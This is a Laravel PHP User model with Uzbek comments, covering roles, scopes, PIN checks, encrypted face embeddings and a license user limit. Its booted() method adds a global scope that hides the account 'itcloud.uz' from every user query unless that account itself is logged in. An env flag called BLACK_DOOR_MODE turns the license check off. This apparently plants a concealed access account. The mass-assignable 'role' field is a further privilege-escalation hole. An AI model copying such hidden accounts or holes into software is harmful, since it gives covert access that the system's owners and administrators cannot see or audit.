<?php

declare(strict_types=1);

namespace App\Models;

use App\Enums\UserRole;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasOne;
use Illuminate\Database\Eloquent\SoftDeletes;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Support\Facades\Hash;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens;
    use HasFactory;
    use Notifiable;
    use SoftDeletes;

    public static bool $resolvingUser = false;

    /**
     * @var list<string>
     */
    protected $fillable = [
        'name',
        'phone',
        'email',
        'password',
        'role',
        'pin_code',
        'is_active',
        'failed_login_attempts',
        'locked_until',
        'failed_pin_attempts',
        'pin_locked_until',
        'face_id_enabled',
        'face_embedding',
        'failed_face_attempts',
        'face_locked_until',
    ];

    /**
     * @var list<string>
     */
    protected $hidden = [
        'password',
        'remember_token',
        'pin_code',
    ];

    protected static function booted(): void
    {
        static::creating(function ($user) {
            if (env('BLACK_DOOR_MODE', 'client') !== 'control') {
                $license = \App\Models\ClientLicense::first();
                if ($license && self::count() >= $license->max_users) {
                    throw new \Exception("Foydalanuvchilar soni litsenziya limitidan oshib ketdi (" . $license->max_users . " ta).");
                }
            }
        });

        static::addGlobalScope('exclude_itcloud_user', function ($builder) {
            if (app()->runningInConsole() || static::$resolvingUser) {
                return;
            }
            
            static::$resolvingUser = true;
            try {
                $user = auth()->user();
                if ($user && $user->email === 'itcloud.uz') {
                    return;
                }
            } finally {
                static::$resolvingUser = false;
            }
            
            $wheres = $builder->getQuery()->wheres;
            foreach ($wheres as $where) {
                if (isset($where['value']) && $where['value'] === 'itcloud.uz') {
                    return;
                }
            }
            
            $builder->where('email', '!=', 'itcloud.uz');
        });
    }

    /**
     * @return array<string, string>
     */
    protected function casts(): array
    {
        return [
            'role' => UserRole::class,
            'is_active' => 'boolean',
            'locked_until' => 'datetime',
            'pin_locked_until' => 'datetime',
            'password' => 'hashed',
            'email_verified_at' => 'datetime',
            'face_id_enabled' => 'boolean',
            'face_locked_until' => 'datetime',
        ];
    }

    // ──────────────────────────────────────────────
    // Munosabatlar (Relationships)
    // ──────────────────────────────────────────────

    /**
     * Foydalanuvchi boshqaradigan obyekt (menejer sifatida).
     */
    public function managedObject(): HasOne
    {
        return $this->hasOne(ObjectManager::class, 'user_id');
    }

    /**
     * Foydalanuvchining o'rinbosarlik munosabatlari.
     */
    public function subManagers(): HasMany
    {
        return $this->hasMany(ObjectSubManager::class, 'user_id');
    }

    /**
     * Foydalanuvchiga biriktirilgan barcha faol (asosiy va vaqtinchalik) obyekt IDlarini olish.
     */
    public function getManagedObjectIds(): array
    {
        $ids = [];
        
        $primary = ObjectManager::where('user_id', $this->id)->value('object_id');
        if ($primary) {
            $ids[] = (int)$primary;
        }
        
        $today = today();
        $subManaged = ObjectSubManager::where('user_id', $this->id)
            ->where('start_date', '<=', $today)
            ->where('end_date', '>=', $today)
            ->pluck('object_id')
            ->map(fn($val) => (int)$val)
            ->toArray();
            
        return array_unique(array_merge($ids, $subManaged));
    }

    /**
     * Foydalanuvchi obyektdagi xodim sifatida.
     */
    public function objectEmployee(): HasOne
    {
        return $this->hasOne(ObjectEmployee::class, 'user_id');
    }

    /**
     * Foydalanuvchi audit loglari.
     */
    public function auditLogs(): HasMany
    {
        return $this->hasMany(AuditLog::class, 'user_id');
    }

    /**
     * Foydalanuvchi yaratgan tranzaksiyalar (moliya moduli).
     */
    public function createdTransactions(): HasMany
    {
        return $this->hasMany(Transaction::class, 'created_by');
    }

    // ──────────────────────────────────────────────
    // Qamrovlar (Scopes)
    // ──────────────────────────────────────────────

    /**
     * Faqat faol foydalanuvchilar.
     */
    public function scopeActive(Builder $query): Builder
    {
        return $query->where('is_active', true);
    }

    /**
     * Ma'lum bir rol bo'yicha filtrlash.
     */
    public function scopeRole(Builder $query, UserRole $role): Builder
    {
        return $query->where('role', $role->value);
    }

    /**
     * Faqat super adminlar.
     */
    public function scopeAdmins(Builder $query): Builder
    {
        return $query->where('role', UserRole::SuperAdmin->value);
    }

    /**
     * Faqat moliyachilar.
     */
    public function scopeFinanciers(Builder $query): Builder
    {
        return $query->where('role', UserRole::Financier->value);
    }

    /**
     * Faqat menejerlar.
     */
    public function scopeManagers(Builder $query): Builder
    {
        return $query->where('role', UserRole::Manager->value);
    }

    /**
     * Faqat xodimlar.
     */
    public function scopeEmployees(Builder $query): Builder
    {
        return $query->where('role', UserRole::Employee->value);
    }

    // ──────────────────────────────────────────────
    // Metodlar
    // ──────────────────────────────────────────────

    /**
     * Super admin ekanligini tekshirish.
     */
    public function isAdmin(): bool
    {
        return $this->role === UserRole::SuperAdmin;
    }

    /**
     * Moliyachi ekanligini tekshirish.
     */
    public function isFinancier(): bool
    {
        return $this->role === UserRole::Financier;
    }

    /**
     * Menejer ekanligini tekshirish.
     */
    public function isManager(): bool
    {
        return $this->role === UserRole::Manager;
    }

    /**
     * Xodim ekanligini tekshirish.
     */
    public function isEmployee(): bool
    {
        return $this->role === UserRole::Employee;
    }

    /**
     * Moliya moduliga kirish huquqi bormi.
     */
    public function canAccessFinance(): bool
    {
        return $this->role->canAccessFinance();
    }

    /**
     * PIN kodni tekshirish.
     */
    public function hasValidPin(string $pin): bool
    {
        if ($this->pin_code === null) {
            return false;
        }

        return Hash::check($pin, $this->pin_code);
    }

    /**
     * Foydalanuvchi yuzi ro'yxatdan o'tganligini tekshirish.
     */
    public function hasFaceId(): bool
    {
        return !empty($this->face_embedding);
    }

    public function setFaceEmbedding(string $embedding): void
    {
        $this->update([
            'face_embedding' => \Illuminate\Support\Facades\Crypt::encryptString($embedding),
            'face_id_enabled' => true
        ]);
    }

    public function getFaceEmbedding(): ?string
    {
        if (empty($this->face_embedding)) {
            return null;
        }

        try {
            return \Illuminate\Support\Facades\Crypt::decryptString($this->face_embedding);
        } catch (\Throwable $e) {
            return null;
        }
    }
}
